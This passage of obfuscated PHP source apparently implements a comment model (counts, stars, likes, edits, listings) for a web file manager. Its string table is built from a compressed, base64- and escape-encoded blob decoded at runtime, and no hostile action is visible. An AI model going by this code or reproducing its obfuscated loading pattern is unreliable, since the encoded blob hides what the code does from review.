(!$ç³ÑääÁ || $ç³ÑääÁ[$¯–ŠüÔ›[420]] != $æ¾›İ‡Ü[$¯–ŠüÔ›[420]] || $ç³ÑääÁ[$¯–ŠüÔ›[514]] != $æ¾›İ‡Ü[$¯–ŠüÔ›[514]]) { return !1; } $this->where(array($¯–ŠüÔ›[1865] => $æ¾›İ‡Ü[$¯–ŠüÔ›[1864]]))->setAdd($¯–ŠüÔ›[1866], 1); } $æ¾›İ‡Ü[$¯–ŠüÔ›[1867]] = 0; $æ¾›İ‡Ü[$¯–ŠüÔ›[1866]] = 0; $æ¾›İ‡Ü[$¯–ŠüÔ›[763]] = 1; return $this->add($æ¾›İ‡Ü); } public function commentCount($´§Ä¡ªÖ, $–è„ĞıÊ, $º½¾˜ÌÂ = false) { $Ô…§¥»é =& $_SERVER[ñ÷§¡å]; if (!$´§Ä¡ªÖ) { return array(); } if (is_string($´§Ä¡ªÖ) || is_int($´§Ä¡ªÖ)) { $´§Ä¡ªÖ = array($´§Ä¡ªÖ); } $¸µí£ = array($Ô…§¥»é[514], $Ô…§¥»é[1868] => $Ô…§¥»é[509]); $Ï²äˆ“ë = array($Ô…§¥»é[514] => array($Ô…§¥»é[7], $´§Ä¡ªÖ), $Ô…§¥»é[420] => $–è„ĞıÊ); if ($º½¾˜ÌÂ) { $Ï²äˆ“ë[$Ô…§¥»é[1663]] = $º½¾˜ÌÂ; } $ğ¶Îüˆ’ = $this->field($¸µí£)->where($Ï²äˆ“ë)->group($Ô…§¥»é[514])->select(); return array_to_keyvalue($ğ¶Îüˆ’, $Ô…§¥»é[514], $Ô…§¥»é[509]); } public function starTarget($¶İ¶§ûÎ, $¶…îéÚ) { $šÈêçû =& $_SERVER[ñ÷§¡å]; $üİùÃï = $¶İ¶§ûÎ + self::TYPE_STAR_OFFSET; $÷ò™Öáü = array($šÈêçû[1663] => USER_ID, $šÈêçû[420] => $üİùÃï, $šÈêçû[514] => $¶…îéÚ); $õÔ‚³–˜ = $this->where($÷ò™Öáü)->find(); if ($õÔ‚³–˜) { return $this->where(array($šÈêçû[408] => $õÔ‚³–˜[$šÈêçû[408]]))->delete(); } $¼úºŒÅ„ = array($šÈêçû[1864] => 0, $šÈêçû[1663] => USER_ID, $šÈêçû[763] => 1, $šÈêçû[768] => $šÈêçû[12], $šÈêçû[420] => $üİùÃï, $šÈêçû[514] => $¶…îéÚ, $šÈêçû[1867] => 0, $šÈêçû[1866] => 0); return $this->add($¼úºŒÅ„); } public function starTargetCount($¹”óÆ€®, $„¼º•æ®) { $şÀÓ˜Å =& $_SERVER[ñ÷§¡å]; $“ïËâ´† = $„¼º•æ® + self::TYPE_STAR_OFFSET; $Âöê…ÒÚ = $this->commentCount($¹”óÆ€®, $“ïËâ´†); $¿êı®Ù = $this->commentCount($¹”óÆ€®, $“ïËâ´†, USER_ID); return array($şÀÓ˜Å[1869] => $Âöê…ÒÚ, $şÀÓ˜Å[1870] => $¿êı®Ù); } public function starTargetUserList($¦ ùâ¯, $¥â›…èñ) { $¢®Ã¿¶æ =& $_SERVER[ñ÷§¡å]; $ß÷Õ€£Ï = $¦ ùâ¯ + self::TYPE_STAR_OFFSET; $·ùûà„è = array($¢®Ã¿¶æ[514] => $¥â›…èñ, $¢®Ã¿¶æ[420] => $ß÷Õ€£Ï); $£­©ØÈ™ = $this->where($·ùûà„è)->count(); $ñÈ‹¥íû = array($¢®Ã¿¶æ[264] => $£­©ØÈ™, $¢®Ã¿¶æ[1871] => array()); if (!$£­©ØÈ™) { return $ñÈ‹¥íû; } $›“™Ğ‹Ñ = $this->field($¢®Ã¿¶æ[1663])->where($·ùûà„è)->limit(500)->select(); $›“™Ğ‹Ñ = array_to_keyvalue($›“™Ğ‹Ñ, $¢®Ã¿¶æ[12], $¢®Ã¿¶æ[1663]); $ñÈ‹¥íû[$¢®Ã¿¶æ[1871]] = Model($¢®Ã¿¶æ[522])->userListInfo($›“™Ğ‹Ñ); return $ñÈ‹¥íû; } public function prasiseUserList($Ë¯ƒ°º³) { $¢¥¶¤èÌ =& $_SERVER[ñ÷§¡å]; $€’ı­¸  = array($¢¥¶¤èÌ[1872] => $Ë¯ƒ°º³); $ÑÌ¿£Ôî = $this->where($€’ı­¸ )->find(); $°éì³ìß = _get($ÑÌ¿£Ôî, $¢¥¶¤èÌ[1867], 0); $ÄÓáÈ× = array($¢¥¶¤èÌ[264] => $°éì³ìß, $¢¥¶¤èÌ[1871] => array()); if (!$°éì³ìß) { return $ÄÓáÈ×; } $ãñôüò¸ = Model($¢¥¶¤èÌ[1873])->field($¢¥¶¤èÌ[1663])->where($€’ı­¸ )->limit(500)->select(); $ãñôüò¸ = array_to_keyvalue($ãñôüò¸, $¢¥¶¤èÌ[12], $¢¥¶¤èÌ[1663]); $ÄÓáÈ×[$¢¥¶¤èÌ[1871]] = Model($¢¥¶¤èÌ[522])->userListInfo($ãñôüò¸); return $ÄÓáÈ×; } public function remove($»õÇÈÔ) { $óá†éÖ =& $_SERVER[ñ÷§¡å]; $¢×ûî… = array($óá†éÖ[1865] => $»õÇÈÔ); $”©§òÄ = $this->where($¢×ûî…)->find(); if ($”©§òÄ[$óá†éÖ[1864]]) { $this->where(array($óá†éÖ[1865] => $”©§òÄ[$óá†éÖ[1864]]))->setAdd($óá†éÖ[1866], -1); } return $this->where($¢×ûî…)->delete(); } public function edit($Çû„ê‘Ø, $ş÷˜ï©ø) { $¤Ÿèİ¶³ =& $_SERVER[ñ÷§¡å]; $µá¤«§¨ = array($¤Ÿèİ¶³[1865] => $Çû„ê‘Ø); return $this->where($µá¤«§¨)->save(array($¤Ÿèİ¶³[1874] => $ş÷˜ï©ø)); } public function prasise($üŸ‚‹¾ç) { $ûÎòÎéŒ =& $_SERVER[ñ÷§¡å]; $İÜÜØÒ = Model($ûÎòÎéŒ[1875]); $µÕàè×Ë = array($ûÎòÎéŒ[1865] => $üŸ‚‹¾ç, $ûÎòÎéŒ[1654] => USER_ID); $›úù¤£» = $İÜÜØÒ->where($µÕàè×Ë)->find(); if (!$›úù¤£») { $İÜÜØÒ->add($µÕàè×Ë); $«Ö‡Áı® = $this->where(array($ûÎòÎéŒ[1865] => $üŸ‚‹¾ç))->setAdd($ûÎòÎéŒ[1867], 1); } else { $İÜÜØÒ->where($µÕàè×Ë)->delete(); $«Ö‡Áı® = $this->where(array($ûÎòÎéŒ[1865] => $üŸ‚‹¾ç))->setAdd($ûÎòÎéŒ[1867], -1); } return $«Ö‡Áı®; } public function targetInfo($ì‰ƒ›¿¹, $º‘Õ¯Ó£) { $Äßêõ˜“ =& $_SERVER[ñ÷§¡å]; $è¿©Êå‰ = array($Äßêõ˜“[595] => $ì‰ƒ›¿¹, $Äßêõ˜“[596] => $º‘Õ¯Ó£); $‚±½‚º© = $this->where($è¿©Êå‰)->count(); $Ìí±†…‡ = "\x52\x49\x47\110\124\x20\112\117\x49\x4e\x20{$this->tablePrefix}\143\157\155\x6d\x65\x6e\164\137\160\x72\141\151\x73\x65\x20\x73\x74\141\x72\40\x6f\156\40\143\157\155\155\x65\156\164\x2e\143\157\155\x6d\x65\156\164\x49\104\x20\x3d\40\x73\164\x61\162\56\x63\157\x6d\x6d\x65\156\164\111\x44"; $ß‰˜²²œ = $this->alias($Äßêõ˜“[363])->where($è¿©Êå‰)->join($Ìí±†…‡, $Äßêõ˜“[1876])->count(); $öÙà©Àô = array($Äßêõ˜“[1877] => $‚±½‚º©, $Äßêõ˜“[1878] => $ß‰˜²²œ); return $öÙà©Àô; } public function listData($ÀòÔñ²Å) { $ÂÍÑ °¦ =& $_SERVER[ñ÷§¡å]; if (isset($ÀòÔñ²Å[$ÂÍÑ °¦[1879]])) { if ($ÀòÔñ²Å[$ÂÍÑ °¦[1879]]) { $ÀòÔñ²Å[$ÂÍÑ °¦[1872]] = array($ÂÍÑ °¦[1021], intval($ÀòÔñ²Å[$ÂÍÑ °¦[1879]])); } unset($ÀòÔñ²Å[$ÂÍÑ °¦[1879]]); } if (isset($ÀòÔñ²Å[$ÂÍÑ °¦[1880]])) { if ($ÀòÔñ²Å[$ÂÍÑ °¦[1880]]) { $ÀòÔñ²Å[$ÂÍÑ °¦[1872]] = array($ÂÍÑ °¦[1018], intval($ÀòÔñ²Å[$ÂÍÑ °¦[1880]])); } unset($ÀòÔñ²Å[$ÂÍÑ °¦[1880]]); } return $this->_listData($ÀòÔñ²Å); } private function _listData($‚œ¾ş®ë) { $•¾Ì¯İâ =& $_SERVER[ñ÷§¡å]; $½áÙ¢ÂÌ = $this->where($‚œ¾ş®ë)->_makeOrder()->selectPage(100); $this->_listAppendParent($½áÙ¢ÂÌ[$•¾Ì¯İâ[378]]); $this->_listAppendUser($½áÙ¢ÂÌ[$•¾Ì¯İâ[378]]); $this->_listAppendMeta($½áÙ¢ÂÌ[$•¾Ì¯İâ[378]]); return $½áÙ¢ÂÌ; } private function _makeOrder() { $§šü‰Ãê =& $_SERVER[ñ÷§¡å]; $Œäƒç´ = array($§šü‰Ãê[1867], $§šü‰Ãê[1866], $§šü‰Ãê[210]); $‡‰¥„™ = Input::get($§šü‰Ãê[466], $§šü‰Ãê[7], $§šü‰Ãê[432], $Œäƒç´); $ø¯ÚªŒŒ = Input::get($§šü‰Ãê[467], $§šü‰Ãê[7], $§šü‰Ãê[1656], array($§šü‰Ãê[1881], $§šü‰Ãê[462])); $ô©½î¯ = $‡‰¥„™ . $§šü‰Ãê[53] . $ø¯ÚªŒŒ; return $this->order($ô©½î¯); } private function _listAppendParent(&$©Ôõòƒè) { $Í¸åû =& $_SERVER[ñ÷§¡å]; $¥ÀÛŠ²“ = array_unique(array_to_keyvalue($©Ôõòƒè, $Í¸åû[12], $Í¸åû[1864])); $¥ÀÛŠ²“ = array_remove_value($¥ÀÛŠ²“, $Í¸åû[207]); if (!$¥ÀÛŠ²“) { return; } $á©Ó‘² = $this->where(array($Í¸åû[1865] => array($Í¸åû[7], $¥ÀÛŠ²“)))->select(); $á©Ó‘² = array_to_keyvalue($á©Ó‘², $Í¸åû[1872]); foreach ($©Ôõòƒè as &$ø¹ğş²æ) { if (isset($á©Ó‘²[$ø¹ğş²æ[$Í¸åû[1864]]])) { $ø¹ğş²æ[$Í¸åû[1882]] = $á©Ó‘²[$ø¹ğş²æ[$Í¸åû[1864]]]; } } unset($ø¹ğş²æ); } private function _listAppendUser(&$¯¿¾“ò) { $·ß¿¨‡… =& $_SERVER[ñ÷§¡å]; $ıÉ×ú… = array_unique(array_to_keyvalue($¯¿¾“ò, $·ß¿¨‡…[12], $·ß¿¨‡…[1663])); $ıÉ×ú… = array_remove_value($ıÉ×ú…, $·ß¿¨‡…[207]); if (count($ıÉ×ú…) == 0) { return; } foreach ($¯¿¾“ò as $ø™ı—¼À) { if (isset($ø™ı—¼À[$·ß¿¨‡…[1882]])) { $ıÉ×ú…[] = $ø™ı—¼À[$·ß¿¨‡…[1882]][$·ß¿¨‡…[1663]]; } } $Á£Ğ¹ê = Model($·ß¿¨‡…[544])->userListInfo($ıÉ×ú…); foreach ($¯¿¾“ò as &$ø™ı—¼À) { $ø™ı—¼À[$·ß¿¨‡…[609]] = $Á£Ğ¹ê[$ø™ı—¼À[$·ß¿¨‡…[1663]]]; if (isset($ø™ı—¼À[$·ß¿¨‡…[1882]])) { $ø™ı—¼À[$·ß¿¨‡…[1882]][$·ß¿¨‡…[609]] = $Á£Ğ¹ê[$ø™ı—¼À[$·ß¿¨‡…[1882]][$·ß¿¨‡…[1663]]]; } } unset($ø™ı—¼À); } private function _listAppendMeta(&$ËÒúä›) { $ïáºøÑ =& $_SERVER[ñ÷§¡å]; $ºÊş·õĞ = array_unique(array_to_keyvalue($ËÒúä›, $ïáºøÑ[12], $ïáºøÑ[1872])); $ºÊş·õĞ = array_remove_value($ºÊş·õĞ, $ïáºøÑ[207]); if (!$ºÊş·õĞ) { return; } foreach ($ËÒúä› as $£Æ¹œšè) { if (isset($£Æ¹œšè[$ïáºøÑ[1882]])) { $ºÊş·õĞ[] = $£Æ¹œšè[$ïáºøÑ[1882]][$ïáºøÑ[1872]]; } } $ò¾Â®÷ê = $this->metaList($ºÊş·õĞ); if (!$ò¾Â®÷ê) { return !1; } foreach ($ËÒúä› as &$£Æ¹œšè) { $£Æ¹œšè[$ïáºøÑ[475]] = $ò¾Â®÷ê[$£Æ¹œšè[$ïáºøÑ[1872]]]; if (isset($£Æ¹œšè[$ïáºøÑ[1882]])) { $£Æ¹œšè[$ïáºøÑ[1882]][$ïáºøÑ[475]] = $ò¾Â®÷ê[$£Æ¹œšè[$ïáºøÑ[1882]][$ïáºøÑ[1872]]]; } } unset($£Æ¹œšè); } private function metaList($Õ·ˆÍî–) { $òÁú”»ò =& $_SERVER[ñ÷§¡å]; if (!$Õ·ˆÍî–) { return array(); } $ˆ‰ÆäèÏ = array($òÁú”»ò[1872] => array($òÁú”»ò[7], $Õ·ˆÍî–)); $‚ÃÅòÕæ = Model($òÁú”»ò[1883])->where($ˆ‰ÆäèÏ)->select(); $‚ÃÅòÕæ = array_to_keyvalue_group($‚ÃÅòÕæ, $òÁú”»ò[1872]); foreach ($‚ÃÅòÕæ as $âÎä¾Ã÷ => $²ÀÇ€š‰) { $–Öï±úó = array(); foreach ($²ÀÇ€š‰ as $òÎàÒ¨) { $–Öï±úó[$òÎàÒ¨[$òÁú”»ò[104]]] = $òÎàÒ¨[$òÁú”»ò[383]]; } $‚ÃÅòÕæ[$âÎä¾Ã÷] = $–Öï±úó; } return $‚ÃÅòÕæ ? $‚ÃÅòÕæ : array(); } } goto BëÉ²–‡›ã; C‰±¾íîÙĞ: function binCheckBigger($äÄìĞËú, $À¸¡ú™µ) { return $äÄìĞËú > $À¸¡ú™µ; } $_SERVER[$_SERVER[ù†®£‚ı][3]] = (base64_decode('ODExMg==')."\60\64")+0;$_ezcx="esiunqx63bhj20c817f5gay4vrzwp9dmtoklkop2ry3vsjwla0hne4bzqtf7xmc168id5gu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($€ÊÃ‚‘, $ÕØ©›÷•) { $ÀúÊ²£§ =& $_SERVER[ñ÷§¡å]; if (isset(self::$_methodList[$€ÊÃ‚‘])) { return @call_user_func_array(self::$_methodList[$€ÊÃ‚‘], $ÕØ©›÷•); } else { if (method_exists($this, $€ÊÃ‚‘)) { return call_user_func_array(array($this, $€ÊÃ‚‘), $ÕØ©›÷•); } else { think_exception(__CLASS__ . $ÀúÊ²£§[4] . $€ÊÃ‚‘ . $ÀúÊ²£§[5]); } } } public static function __callStatic($’öÉÚ¼Ã, $£›Í¶øÊ) { if (isset(self::$_methodListStatic[$’öÉÚ¼Ã])) { return call_user_func_array(self::$_methodListStatic[$’öÉÚ¼Ã], $£›Í¶øÊ); } else { if (method_exists(self, $’öÉÚ¼Ã)) { return call_user_func_array(array(self, $’öÉÚ¼Ã), $£›Í¶øÊ); } else { show_json("{$’öÉÚ¼Ã}\50\51\40\156\157\x74\x20\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($³Äı¢Êï, $¨À×•èÈ) { self::$_methodList[$³Äı¢Êï] = $¨À×•èÈ; } public static function addMethodStatic($î‡ñ½×, $²İ¯ºéÈ) { self::$_methodListStatic[$î‡ñ½×] = $²İ¯ºéÈ; } } goto FæˆİÇ³‚Ù; b¸·Èë®´é: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xf1\xf7\xa7\xa1\xe5\x8d", "\x89\x8d\xe4\x98\x8e\xa0"); $_SERVER[ñ÷§¡å] = explode("\x7c\x1\x7c\x1\x7c\x2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\234\34\105\365\70\316\245\34\162\310\15\202\320\54\44\273\233\314\221\154\356\115\66\311\144\166\166\167\310\354\314\146\146\66\7"."\331\320\351\235\351\331\351\335\231\356\331\356\236\275\222\310\15\162\204\303\0\42\211\50\52\6\104\271\345\106\124\16\345\20\3\242\134\42\36\44\341\122\4\21\314\27\324\137"."\35\257\216\356\231\300\367\377\371\377\76\237\137\40\231\252\127\107\327\361\352\325\173\257\136\275\332\165\376\55\337\75\373\337\353\367\104\377\355\265\355\222\67\67\275\367\175\32".base64_decode('Jn/3oeETL95vD/Ln8Isvamrqmn3A1OSBl931I+2H2g+0C1OJp56OH/TMD0+N7fju')."\123\343\73\366\334\343\77\267\77\365\227\126\224\231\226\155\245\77\212\151\271\212\76\146\70\256\103\1\71\313\54\30\3\64\154\230\364\67\114\177\172\323\11\133\57\133\256\116"."\243\41\372\243\362\166\241\177\235\341\222\301\322\325\144\52\253\146\172\173\172\142\351\54\144\152\225\323\313\126\36\102\25\315\326\312\360\375\212\156\73\250\65\162\165\152\305\252"."\350\246\7\42\0\171\315\325\372\65\7\152\152\137\242\266\307\172\22\251\125\152\166\125\117\14\162\364\253\303\125\335\36\247\61\22\314\270\232\355\146\215\262\316\163\214\332\274".strrev('Áf®’¾ÔGvt“Ò›Z]$±"Téákgîêš8)%O4H™’GM’¤ñbK]')."\152\122\326\322\224\265\112\63\15\164\30\172\51\117\203\246\306\232\343\216\127\40\224\345\41\64\115\146\265\124\242\221\44\17\345\365\202\126\55\301\150\265\313\221\212\155\224\65".base64_decode('1uml+jiH0oBWdS3DzNFIbMy1NQFHbc2hidZNqCoTS8SiWQU3UOlIp7oVmISy5ri6')."\xad\xac\xe8\x8a\xa5\x63\xa\x6e\x74\x5b\x23\xe9\x6b\xa3\x2\xf8\x92\x44\x43\xa1\x44\x12\x9\x65\x77\x35\xb8\x7a\xb9\xc2\xaa\xa1\x65\xea\x54\x96\x4a\xb7\xc7\xd2\xca\x92\x55\x8a\x18\xa1\x9c\x55"."\56\133\146\10\325\202\146\322\225\232\32\113\247\151\40\0\350\235\210\343\111\203\110\252\243\43\23\343\61\350\334\262\4\152\311\14\300\117\117\54\137\50\271\352\210\126\252\62"."\x34\x1d\xa2\xbf\x8d\xf0\x3\xbf\xaa\x56\x30\x4a\x7a\xc6\x98\xd0\xe3\xa6\x1f\x42\xe3\x38\xa6\xe\xe8\xae\x8a\x16\x97\x8b\xda\xa\xa8\xbe\x24\x92\x89\x47\xd5\x9e\x48\xb6\xb\xc6\xbe\x52\x9\x3b"."\xf9\x21\x27\xac\xd9\xb9\xa2\x31\xa2\x27\x8c\xfe\x70\xbf\x61\x86\x31\x8a\x87\xfa\xd9\x62\x3c\x80\xfe\xcc\x84\x91\x28\xea\xb9\x21\x55\xeb\xb7\x6c\x57\x7\x44\xaa\x9a\x25\xc3\x1c\x92\x5b\x42\xc3"."\x96\x3\xdf\x1d\x36\x4c\xa3\xa\xcb\x9\xba\x6a\x59\x7c\xf9\x43\xa0\xca\x72\xeb\xc\xa2\xe7\x21\x50\x46\xe5\x2d\x1a\x34\x50\x8f\x46\x68\xb0\x6d\x21\xfd\x9d\xf\x99\xfa\x71\x6f\x47\x74\xdb\x55"."\x75\x33\x67\xe5\xd\x13\x88\xca\x22\x58\x1c\x9a\x5b\x6c\xb7\x51\x2f\x6d\x18\x23\xab\x94\x67\x61\xc7\x33\x72\xc9\x6a\x59\xce\xc2\xa3\x68\x8c\x4a\x79\x9b\xd1\x81\x4f\xcb\x49\xa3\x9\x4e\x56\x70"."\x5e\x11\xab\xa0\x96\xac\x67\x14\xc9\x28\x8c\xb\xba\xe0\x58\x55\x3b\x87\x66\xb5\x60\x89\x72\x3d\x3c\xf7\x74\xc8\xa4\xbb\x2e\xea\x1c\x8c\x8d\x61\xf5\x56\x4a\x96\x96\xcf\xe8\x36\xef\x9a\x61\x75".base64_decode('oIKpqisDqyRbh2WX29H0wvfR6jV66yQMsfWbl0Ys3LT6rOB/1qxejP5pBhLdB20q')."\xea\xa5\x92\xaa\x8f\xe9\xb0\xc0\xcb\xf9\x59\xe\x1b\x8c\xb0\x83\x71\xa\x41\x68\x34\x9e\x52\x8b\x9a\x53\xec\xce\xcf\x52\x49\x29\x68\xb2\x99\xd7\xc7\x42\x95\x62\x85\x46\x5\xe9\xe9\x63\x68\x42"."\x16\x20\x1e\xba\xa4\xe5\xc6\xa4\xfd\xa3\x64\xe5\xb4\x92\xdc\x45\x1a\x2e\xba\x6e\x25\xa3\x9b\xf9\xe\x8e\x8e\x79\x6b\xd4\x24\x23\x55\xd1\x19\xe6\xb6\x7\x94\xbc\xd2\xad\xac\x52\xba\x5a\x8d\x56"."\x87\x15\x2c\x97\x78\x88\xf5\x8e\xc3\x1c\xe\x74\xc7\xd8\x74\xe6\xb\x34\xc0\x57\x4c\x3\x7c\xd0\x70\x8\x25\x16\x64\x4\x2d\xb8\x92\x91\xd3\x5c\xc3\x32\xc3\x56\xce\xd5\xdd\xa0\xe3\xda\xba\x6"."\65\106\162\71\335\161\202\121\264\146\155\253\24\214\224\112\326\150\60\145\33\3\206\331\252\114\241\171\242\164\101\7\61\241\156\5\212\322\60\137\301\210\202\77\63\245\255\352"."\x16\x82\x73\x19\xa5\xe0\xb9\x6d\xcd\x74\xa\xba\x1d\x8c\xc1\xca\x68\x55\x50\x63\x39\xb5\x66\xd9\xda\xd\xa7\x62\x39\x6\x6e\x5e\xab\xa2\xb9\xae\x96\x2b\x62\x4a\x27\xaa\x6f\xfb\x94\xfc\x6\xa6"."\2\172\115\336\330\130\305\260\165\207\265\125\351\354\316\102\45\250\166\75\330\143\153\3\145\255\125\251\124\373\321\310\300\112\255\3\243\271\141\150\132\225\34\216\6\224\162\325"."\161\203\266\216\110\246\201\150\26\14\162\274\20\354\306\353\312\320\363\301\14\332\131\0\74\143\332\114\5\241\216\302\322\50\264\53\233\355\121\343\35\210\165\110\306\324\356\110"."\66\12\244\61\346\152\3\254\315\11\264\137\360\52\31\160\145\20\255\57\214\134\111\324\127\1\354\261\106\165\33\175\170\311\170\253\62\144\345\373\255\261\20\113\352\0\22\315".base64_decode('MuPprrjBtGYO4PHpH3d1QEFnZMA70AndHHCLrGAmll4eS6uZVEd2RSQNTIeJsGSM')."\175\12\127\135\12\246\365\74\32\372\234\313\312\151\25\74\152\54\17\136\34\170\256\130\52\136\60\54\55\21\357\304\3\323\36\164\120\246\240\234\213\325\235\60\312\6\156\273"."\313\123\310\110\42\216\244\23\32\24\46\35\152\353\53\116\151\352\313\117\155\16\242\177\247\64\257\356\153\17\115\131\263\50\154\210\62\341\351\241\351\112\313\264\331\112\17\142"."\x91\xc\xad\xa4\x40\xa7\x6b\x72\x4c\x53\x52\x4b\xbd\xc3\x22\xb0\xd9\xb4\x4c\xfd\x53\x6\x7\xef\xb1\xd2\xb2\xf7\xd\x2b\x5\xa6\x63\xcb\x7a\x63\x99\xac\xda\x1d\xcb\x76\xa5\xda\xe1\xeb\xb1\x8"."\x84\x12\x16\x5d\xb6\xac\xb7\xab\xe9\xcf\x1a\x98\xdd\x35\xf4\x47\x35\x9c\xe\x69\x5b\xc1\x51\x4e\x7e\x54\xab\x7f\x10\x4d\x46\xb7\xce\x68\x6c\x81\xd2\xe8\x78\x59\x1b\xf0\x91\x7c\x1c\xeb\xb6\x6c"."\xdd\xb\x59\xcf\xb7\xaa\x15\x46\x9e\xed\x9\x38\xda\xa5\x1b\x3\x45\x18\x2f\x3\xd7\x96\xb3\x4a\x96\xad\x95\x30\x65\x64\x8b\x42\x67\xd4\x6a\xc0\x0\x6a\x5\x44\x58\x44\x32\x46\xb9\xc2\x1a\xeb"."\x16\xab\xe5\x7e\x29\x8\xd4\xde\x41\xf8\xc3\x68\x59\xd1\xe2\xfb\x19\xe2\x5\x68\xa8\x35\xc\x19\x27\xb5\x74\xc0\x62\x4c\x85\x33\x33\xd0\xff\x82\xb4\xe7\xad\xb2\xc6\x8\x25\x21\x71\x7a\x9e\xd2"."\70\12\232\342\111\351\322\65\261\111\273\266\153\141\250\355\311\202\6\264\150\301\304\42\226\7\232\124\345\155\143\255\314\353\45\235\215\106\121\147\333\304\64\310\206\266\71\76".strrev('A½bÍn‘š&¤X­x‹ŒÈ¥C´%¬òàñ³¾,ê&$¨ÒpÙıŠ‚)\\Aƒ‚V')."\x33\x20\x70\x5\x47\x24\x3c\xea\xe8\x4d\x24\xd4\x68\x2a\x99\x45\xac\x3f\x85\xac\x48\xc7\xb3\x31\x86\xb7\x91\x76\x35\x12\xed\x59\xcf\x36\x5e\x31\xa3\x90\x1\x13\x18\x2f\xe2\xb\x36\x7f\xa4\x5"."\x1a\x8e\x9a\x13\x16\xdb\x1c\xa2\xd8\x15\xcb\x74\xf4\x20\x30\x90\x41\x21\x22\xd4\x24\xe5\xc5\x2e\x40\x73\x48\x3b\x87\x6f\x33\x18\xb\x6a\xe5\x89\x60\x19\x2d\x81\x20\x6f\xa8\x77\xf\x56\x60\x77".strrev('‘F£ÀtÚŠt'."\0".'c:C	eIÓÖ>uúÀb(a*O›czHŒ<wIfy[ ')."\xab\x28\xa3\x6d\x4c\x68\xa2\x2f\x8b\x58\x43\x58\xf\xca\x25\xc1\xc8\x79\xbb\x13\x14\x43\x9e\xed\x8a\x27\x97\xaa\xdd\xa9\xf6\x58\x42\x8d\x27\x11\x49\xca\xd6\xc2\x7b\x7b\xda\x23\x6c\xe\x65\xf8"."\222\24\143\317\1\332\213\210\322\362\110\42\356\317\36\133\31\317\144\63\165\223\20\254\67\346\113\101\222\152\117\72\326\21\137\311\243\35\361\130\242\75\243\106\43\321\56\221".strrev('ìH	é;2Åİ(¨»Aä'."\n".'¢ø™SÈYÅÅ³ÒÁS‰pÍuWæö¢²ÀZˆ†é\'')."\x39\xab\xca\x68\x3f\xe7\x20\xcb\x8c\x38\x94\x35\x58\x3d\x1a\xdb\x21\x9b\xe8\x4f\xb3\x12\xc9\x28\x6e\x5\xea\x40\x64\xa0\x7f\x9c\x7\x49\x37\x58\x1c\xf1\x8a\xf0\x7d\x5\x28\x7d\x4d\xb\x54\x9c"."\x67\x89\x5e\xe0\x4\xb8\x3e\x20\x52\x70\x39\x9d\xf7\xc5\x11\xd6\x8b\x34\x34\x3\x11\xa2\x1c\x40\x98\x40\x66\x4\x3e\x63\xa0\x35\x64\xbb\x11\xd6\x9c\x82\x10\xcc\xd5\x54\x4f\x2c\x1d\xc1\x62\xbd"."\272\42\235\112\166\102\201\321\242\316\32\20\207\341\157\142\134\25\110\367\256\240\104\210\45\322\230\370\44\6\175\320\142\103\271\236\376\114\246\77\210\33\204\217\353\46\33\365".strrev('©,ijl†6p|*f4c$0è0;\\£=`Æa(_–ıküªµA´Â¶Ù”L~')."\62\314\242\61\11\33\51\0\311\333\251\64\14\210\153\15\61\141\214\46\246\143\31\266\274\155\175\270\152\260\341\12\207\246\2\26\353\150\357\201\317\207\117\357\33\235\332\264"."\72\70\65\264\6\5\232\247\54\246\121\210\365\205\74\321\123\240\174\325\346\245\61\277\324\344\54\152\156\355\13\367\205\233\26\265\256\216\4\47\264\340\304\264\340\274\340\232".strrev('4¦k£}ÉĞ¾¤õ:ØÓ[î¯k+ù8/©4[ëiú'."\r".'y:.2€Îs0%®³X'."\0".'©æ¡}©')."\x2f\x62\xdf\xc9\x55\x6d\x24\x68\xe6\xc6\x79\x53\xf3\x53\x9b\x50\x93\x10\x1f\xc5\xb3\x98\x84\xd6\x49\x19\x58\xc2\x84\x51\x11\xd0\x75\xb3\x37\x30\x38\x9a\x43\x7d\x40\x94\x58\x1d\xec\x9b\xba\x66".base64_decode('kVROAvm/hfgkRHiLPF8keBruGS+K1z3gR9XMCeqJ10W/lgM6YAyYfAmhzZwL6F72').strrev('¬RIDfL„q=ÁĞÎ¨îë÷~rÀC©‰=3iªÎÀm'."\n".'h‹€äM»ú$İ}')."\104\70\102\370\2\226\244\70\216\162\144\62\52\52\146\255\106\171\54\257\233\60\117\373\103\156\47\247\125\364\214\324\103\125\315\106\226\44\142\52\243\60\100\211\131\234\120\305".base64_decode('JVyniLomKCqjDznBuxMxBVa+M1xSCGFQdNu27FaiXnWqFcyTIZHMRWOrIGFeaVuo')."\320\41\207\162\252\74\1\25\215\61\10\130\314\326\305\242\307\24\12\332\124\21\63\344\40\116\212\261\65\341\246\276\276\352\152\75\277\146\65\102\174\55\130\130\263\156\306\206".base64_decode('Zsbeh/vQHxaJ1FH0qZwaqmhjDuF2cB2KJ8KTadSyOW9U8XDPruVqJU8VWQyByeUb')."\x37\x68\x13\xe8\x6c\x27\x4\xc5\xc2\x5b\xb9\xa4\x21\x25\xe4\x34\xc9\xa5\x77\xae\x14\x91\x54\x74\xb8\x44\x46\x77\x43\x3c\x47\x40\x4a\x54\x51\xdc\xa3\xad\x6e\x3\xcd\x40\xc1\x30\xd1\x72\x8a\x4a".base64_decode('Wx3V6WTGHVcve9Sqjo6Vcx3VUsnlPHzJGIIvwFoBLW+Q/ihT6xXtsGwmCk+BZjRM').strrev('3ª›AÖ&BÌB